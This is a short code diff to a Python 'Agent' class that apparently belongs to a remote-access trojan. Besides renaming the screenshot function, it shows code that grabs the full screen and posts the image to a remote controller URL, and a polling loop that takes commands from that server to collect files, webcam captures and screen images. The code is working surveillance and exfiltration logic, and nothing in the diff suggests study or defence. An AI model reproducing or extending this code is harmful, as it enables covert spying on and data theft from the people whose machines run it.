@@ -35,13 +35,13 @@ class Agent():
             print(f"[-] FATAL ERROR: {e}")
     
     
-    def get_screenshot(self):
+    def get_screen(self):
         with mss.MSS() as sct:
             shot = sct.grab(sct.monitors[0])
             png_bytes = mss.tools.to_png(shot.rgb, shot.size)
         requests.post(
-            self.pointurl + "/screenshot",
-            files={"file": ("screenshot.png", png_bytes, "image/png")},
+            self.pointurl + "/screen",
+            files={"file": ("screen.png", png_bytes, "image/png")},
             data={"id": self.id}
         )
 
@@ -114,7 +114,7 @@ def task_check(url):
         if task == "NONE": return False
         elif task == "FILES": me.get_files()
         elif task == "WEBCAM": me.get_webcam()
-        elif task == "SCREENSHOT": me.get_screenshot()
+        elif task == "SCREEN": me.get_screen()
         elif task == "WHO": connect(url)
         
     except requests.exceptions.ConnectionError:
